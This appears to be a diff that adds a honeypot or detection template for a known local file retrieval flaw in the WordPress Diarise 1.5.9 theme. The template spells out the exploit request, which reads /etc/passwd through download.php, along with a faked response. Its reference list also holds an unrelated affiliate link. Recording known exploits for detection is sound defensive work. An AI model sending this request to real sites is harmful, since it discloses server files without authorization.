@@ -1,0 +1,26 @@
+id: diarise-theme-lfi
+info:
+  name: WordPress Diarise 1.5.9 - Arbitrary File Retrieval
+  author: 0x_Akoko
+  description: WordPress Diarise theme version 1.5.9 suffers from a local file retrieval
+    vulnerability.
+  severity: high
+  reference:
+  - https://packetstormsecurity.com/files/152773/WordPress-Diarise-1.5.9-Local-File-Disclosure.html
+  - https://cxsecurity.com/issue/WLB-2019050123
+  - https://woocommerce.com/?aff=1790
+  classification:
+    cwe-id: CWE-98
+  metadata:
+    max-request: 1
+  tags: packetstorm,wordpress,wp-theme,lfi
+traps:
+- request:
+    method: GET
+    path: /wp-content/themes/diarise/download.php?calendar=file:///etc/passwd
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: root:[x*]:0:0
